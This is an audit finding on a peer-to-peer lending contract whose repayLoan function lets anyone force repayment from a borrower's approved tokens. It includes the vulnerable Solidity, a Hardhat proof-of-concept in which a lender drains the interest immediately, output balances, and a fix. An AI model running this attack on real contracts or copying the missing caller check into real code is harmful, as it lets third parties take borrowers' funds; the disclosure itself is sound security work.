---
id: 23259
severity: "High"
---

# Anyone can call repayLoan on the borrower and pull funds from their account to repay loan

## Description

The `repayLoan` function can be called by anyone to repay a loan, the issue with this function is that it pulls funds from the borrower's account irrespective of the person calling the `repayLoan` function. The `repayLoan` function grants anyone the access to transfer funds from the lender's account this is not a good practice as it can be exploited by malicious parties, especially lenders who can gain from it:
```solidity
function repayLoan(uint256 loanId) external nonReentrant {
    Loan memory _loan = loans[loanId];
    require(_loan.status == Status.Active, "invalid status");
    // @audit can bypass fees
    uint256 protocolFee = (_loan.repaymentAmount - _loan.assetAmount) * PROTOCOL_FEE / 10000;
    uint256 amountToLender = _loan.repaymentAmount - protocolFee;
    loans[loanId].status = Status.Repaid;
    // since the token could be ERC777 and the lender could be a contract, there is a possible DoS attack vector during repayment/liquidation
    // this is acceptable, since borrowers are expected to be aware of the risk when using non-standard tokens
    IERC20(_loan.asset).safeTransferFrom(_loan.borrower, _loan.lender, amountToLender); // return asset
    IERC20(_loan.collateral).safeTransfer(_loan.borrower, _loan.collateralAmount); // return collateral
    IERC20(_loan.asset).safeTransferFrom(_loan.borrower, feeCollector, protocolFee);
    emit LoanRepaid(loanId, _loan.borrower, _loan.lender);
    emit ProtocolRevenue(loanId, _loan.asset, protocolFee);
}
```
Impact: Anyone can repay a Loan with the borrower's funds without their consent leading to financial loss to the borrower in terms of fees and interest. (Lenders are incentivized to do this to earn quick bucks). For example, if a borrower wants the loan for a year, the attacker (malicious lender), can repay the loan immediately they fill the loan request leading to loss for borrower and financial gain for the attacker. Likelihood: The likelihood for this to happen is that the borrower has given enough allowance to the contract (contracts usually take maximum approval in some cases) and the borrower has enough funds to cover the loan repayment, this can usually happen if they have funds in their account before taking the loan. So the likelihood is medium.

## Proof of Concept

The following test shows that a malicious lender can fill a loan request and call repay immediately, the borrower will have to pay the loan with interest even though they didn't use the loan. Add the test below to this folder and run the code hyperlend-p2p/contracts/test:
```javascript
const { expect } = require("chai");
const { encodeLoan } = require("./utils")
describe("POC-2", function () {
    let loanContract;
    let borrower;
    let lender;
    let deployer;
    let loan;
    let mockAsset;
    let mockCollateral;
    let aggregatorAsset;
    let aggregatorCollateral;
    beforeEach(async function () {
        const LoanContract = await ethers.getContractFactory("LendingP2P");
        [borrower, lender, deployer] = await ethers.getSigners();
        loanContract = await LoanContract.connect(deployer).deploy();
        const MockToken = await ethers.getContractFactory("MockERC20");
        mockAsset = await MockToken.connect(borrower).deploy()
        mockCollateral = await MockToken.connect(borrower).deploy()
        const MockAggregator = await ethers.getContractFactory("Aggregator");
        aggregatorAsset = await MockAggregator.connect(deployer).deploy();
        aggregatorCollateral = await MockAggregator.connect(deployer).deploy();
        await aggregatorAsset.connect(deployer).setAnswer(200000000000); //2k usd
        await aggregatorCollateral.connect(deployer).setAnswer(5000000000000); //50k usd
        await mockAsset.connect(borrower).approve(loanContract.target, ethers.parseEther("1000000"));
        await mockCollateral.connect(borrower).approve(loanContract.target, ethers.parseEther("1000000"));
        loan = {
            borrower: borrower.address,
            lender: "0x0000000000000000000000000000000000000000",
            asset: mockAsset.target,
            collateral: mockCollateral.target,
            assetAmount: ethers.parseEther("10"),
            repaymentAmount: ethers.parseEther("11"),
            collateralAmount: ethers.parseEther("1"),
            duration: 30 * 24 * 60 * 60,
            liquidation: {
                isLiquidatable: true,
                liquidationThreshold: 8000, //liquidated when loan value > 80% of the collateral value
                assetOracle: aggregatorAsset.target,
                collateralOracle: aggregatorCollateral.target
            },
            status: 0 //Pending
        };
    });
    it("Abuse of repay", async function () {
        let encodedLoan = encodeLoan(loan);
        //Approve
        await mockCollateral.connect(borrower).approve(loanContract.target, loan.collateralAmount)
        await mockAsset.connect(borrower).approve(loanContract.target, loan.repaymentAmount * 2n) //High Approval simulating uint256 max
        await mockAsset.connect(lender).approve(loanContract.target, loan.repaymentAmount)
        await mockAsset.connect(borrower).transfer(lender.address, loan.assetAmount)
        //Borrow loan
        await loanContract.connect(borrower).requestLoan(encodedLoan);
        await loanContract.connect(lender).fillRequest(0);
        console.log("\nBorrower Balance Before Attack: ", await mockAsset.balanceOf(borrower.address))
        console.log("Attacker's Balance Before Attack: ", await mockAsset.balanceOf(lender.address))
        //Lender repays loan immediately to steal from borrower
        await loanContract.connect(lender).repayLoan(0)
        console.log("Borrower Balance After Attack: ", await mockAsset.balanceOf(borrower.address))
        console.log("Attacker's Balance After Attack: ", await mockAsset.balanceOf(lender.address))
    });
});
```
Output:
```
POC-2
Borrower Balance Before Attack: 1000000000000000000000000000n
Attacker's Balance Before Attack: 0n
Borrower Balance After Attack: 999999989000000000000000000n
Attacker's Balance After Attack: 10800000000000000000n
```

## Recommendation

```solidity
function repayLoan(uint256 loanId) external nonReentrant {
    Loan memory _loan = loans[loanId];
    require(_loan.status == Status.Active, "invalid status");
    // @audit can bypass fees
    uint256 protocolFee = (_loan.repaymentAmount - _loan.assetAmount) * PROTOCOL_FEE / 10000;
    uint256 amountToLender = _loan.repaymentAmount - protocolFee;
    loans[loanId].status = Status.Repaid;
    // since the token could be ERC777 and the lender could be a contract, there is a possible DoS attack vector during repayment/liquidation
    // this is acceptable, since borrowers are expected to be aware of the risk when using non-standard tokens
    IERC20(_loan.asset).safeTransferFrom(msg.sender, _loan.lender, amountToLender); // return asset
    IERC20(_loan.collateral).safeTransfer(_loan.borrower, _loan.collateralAmount); // return collateral
    IERC20(_loan.asset).safeTransferFrom(msg.sender, feeCollector, protocolFee);
    emit LoanRepaid(loanId, _loan.borrower, _loan.lender);
    emit ProtocolRevenue(loanId, _loan.asset, protocolFee);
}
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an improper authorization flaw in the loan repayment routine. The contract’s repayLoan function pulls the repayment amount from the borrower’s token balance using safeTransferFrom(_loan.borrower, …) without verifying that the caller is the borrower. Because the function does not check msg.sender against the stored borrower address, any external account – including the lender or a malicious third party – can invoke repayLoan while the loan is active. When the function is called, it calculates the protocol fee, transfers the repayment amount (principal plus interest) from the borrower to the lender, returns the collateral to the borrower, and sends the fee to the fee collector. This sequence executes even if the borrower never initiated the repayment, provided the borrower has previously approved the contract to spend the asset token, which is a common pattern for ERC20 loans. An attacker can therefore force the borrower to pay interest and fees they never used, effectively stealing the interest margin. From the user’s perspective the borrower sees their token balance decrease unexpectedly after the loan is marked as repaid, while the collateral is returned as expected, leading to confusion and apparent loss of funds. The impact includes direct financial loss for borrowers, unfair profit for malicious lenders, and erosion of trust in the protocol. The issue occurs after a loan is funded and the borrower’s allowance is set, which is typical in lending workflows. It was discovered during a security audit and reproduced with a test that shows a lender filling a loan request and immediately calling repayLoan, resulting in the borrower’s balance dropping by the interest amount. The flaw is subtle because the function name and comments suggest that only the borrower should call it, so reviewers may overlook the missing access control. The bug belongs to the class of “missing caller authentication” or “unauthorized token pull” vulnerabilities, where a contract pulls funds from an account without proper permission checks. To remediate, the repayment logic should either require that msg.sender equals the stored borrower address, or redesign the flow so that the borrower explicitly initiates the transfer (e.g., by using safeTransferFrom(msg.sender, …) or by having the borrower call a separate approve-and-pull function). Adding a require statement that enforces caller identity or using a pull payment pattern would prevent arbitrary parties from forcing repayment and protect borrowers from unintended fee deductions.
